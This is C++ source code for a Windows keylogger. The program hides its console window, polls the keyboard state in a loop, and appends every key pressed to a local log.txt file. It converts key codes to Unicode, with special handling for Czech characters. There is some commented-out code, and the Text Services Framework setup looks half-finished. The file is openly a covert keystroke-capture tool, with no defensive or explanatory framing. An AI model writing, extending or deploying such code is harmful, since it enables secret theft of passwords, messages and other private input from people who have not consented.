#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <ctfutb.h>
#include <msctf.h> 
#include <codecvt>

class KeyLogger {
    public:
        KeyLogger(const std::string& log_file_name);
        void start_logging();
        HRESULT initialize_tsf();
        void activate_language_profile(REFCLSID profileGUID);
        void enable_text_services(ITfFunctionProvider* pProvider);

    private:
        bool logging;
        std::ofstream log_file;

        void log_key(int key);   
        TfClientId m_tfClientId;
        DWORD m_dwCookie; // cookie for ITfFunctionProvider, cookie - in (COM) is identifier which tracking a particular registration or advising of a sink with an object.
        

};

KeyLogger::KeyLogger(const std::string& log_file_name): logging(1) {
    log_file.open(log_file_name, std::ios_base::app | std::ios_base::out | std::ios_base::binary);
    if (!log_file) {
        std::cerr << "Error opening log file" << std::endl;
        return;
    }
    HRESULT hr = initialize_tsf();
    if (FAILED(hr)) {
        std::cerr << "Error initializing TSF" << std::endl;
    }
}


HRESULT KeyLogger::initialize_tsf() {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

    if (SUCCEEDED(hr)) {
        ITfThreadMgr* pThreadMgr = nullptr;
        hr = CoCreateInstance(CLSID_TF_ThreadMgr, nullptr, CLSCTX_INPROC_SERVER, IID_ITfThreadMgr, (void**)&pThreadMgr);
        if (SUCCEEDED(hr)) {
            hr = pThreadMgr->Activate(&m_tfClientId);
            pThreadMgr->Release();
        }
    }
    return hr;
}


void KeyLogger::enable_text_services(ITfFunctionProvider* pFuncProvider) {
    ITfSource* pSource = nullptr;
    HRESULT hr = pFuncProvider->QueryInterface(IID_ITfSource, (void**)&pSource);
    if (SUCCEEDED(hr)) {
        hr = pSource->AdviseSink(IID_ITfFunctionProvider, (ITfFunctionProvider*)this, &m_dwCookie);
        pSource->Release();
    }
}


void KeyLogger::activate_language_profile(REFCLSID profileGUID) {
    ITfInputProcessorProfiles* pInputProfiles = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_TF_InputProcessorProfiles, nullptr, CLSCTX_INPROC_SERVER, IID_ITfInputProcessorProfiles, (void**)&pInputProfiles);
    if (SUCCEEDED(hr)) {
      
        hr = pInputProfiles->ActivateLanguageProfile(profileGUID, m_tfClientId, GUID_TFCAT_TIP_KEYBOARD);
        pInputProfiles->Release();
    }
}



void KeyLogger::start_logging() {
    while (logging) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x1) {
                log_key(key);
            }
        }
    }
}


void KeyLogger::log_key(int key) {
    std::wofstream log_file;
    log_file.open("log.txt", std::ios_base::app | std::ios_base::out | std::ios_base::binary);
    log_file.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));

                
    if (key == VK_SPACE) {
        log_file << L"[SPACE]";
    } else if (key == VK_RETURN) {
        log_file << L"[ENTER]";
    } else if (key == VK_BACK) {
        log_file << L"[BACKSPACE]";
    // } else if (key >= 32 && key <= 126) {
    //     // log_file.put(static_cast<char>(key));

    //     log_file.put(static_cast<wchar_t>(key));

    //     //TODO Handle uppercase letters if shift is pressed

    //     // if (GetAsyncKeyState(VK_CAPITAL) & 0x001) { 
    //     //     log_file.put(static_cast<wchar_t>(key));
    //     // } else {
    //     //     log_file.put(static_cast<wchar_t>(key + 32));
    //     // }


    // }
    } else {
        // static const wchar_t* cyrillicChars = L"абвгдежзийклмнопрстуфхцчшщъыьэюя";
        // static const wchar_t* czechSlovakianChars = L"áéíóúýčďěňřšťůžôä";
        WCHAR unicodeChar;
        if (ToUnicode(key, MapVirtualKey(key, 0), nullptr, &unicodeChar, 1, 0) > 0) {
            log_file << L"[" << unicodeChar << L"]";

        // if (key >= VK_OEM_1 && key <= VK_OEM_3) {
        //     log_file << L"[" << static_cast<wchar_t>(key) << L"]";
        // }
        // else if (key >= 160 && key <= 175) {
        //     log_file << cyrillicChars[key - 160];
        // } else if (key >= 129 && key <= 142) {
        //     log_file << czechSlovakianChars[key - 129];
        } else {
           
            switch (key) {
                case VK_SHIFT:
                    log_file << L"[SHIFT]";
                    break;
                case VK_CONTROL:
                    log_file << L"[CONTROL]";
                    break;
                case VK_TAB:
                    log_file << L"[TAB]";
                    break;    
                case VK_MENU:
                    log_file << L"[ALT]";
                    break;
                case VK_CAPITAL:
                    log_file << L"[CAPS LOCK]";
                    break;
                case VK_LBUTTON:
                case VK_RBUTTON:
                    break;
                case VK_ESCAPE:
                    log_file << L"[ESCAPE]";
                    break;
                case 353:
                    log_file << L"[š]";
                    break;
                case 269:
                    log_file << L"[č]";
                    break;
                case 345:
                    log_file << L"[ř]";
                    break;
                case 225:
                    log_file << L"[á]";
                    break;
                case 237:
                    log_file << L"[í]";
                    break;
                case 233:
                    log_file << L"[é]";
                    break;
                case 250:
                    log_file << L"[ú]";
                    break;
                case 367:
                    log_file << L"[ů]";
                    break;
                case 328:
                    log_file << L"[ň]";
                    break;
                case 283:
                    log_file << L"[ě]";
                    break;
                case 382:
                    log_file << L"[ž]";
                    break;
                case 253:
                    log_file << L"[ý]";
                    break;
                default:
                    log_file << L"[" << key << "]";
                    break;

            }
        }
    }
    log_file << std::endl;
}


int main() {

    


    ShowWindow(GetConsoleWindow(), SW_HIDE);
    KeyLogger logger("log.txt");
    logger.start_logging();
    CoUninitialize();
    return 0;
}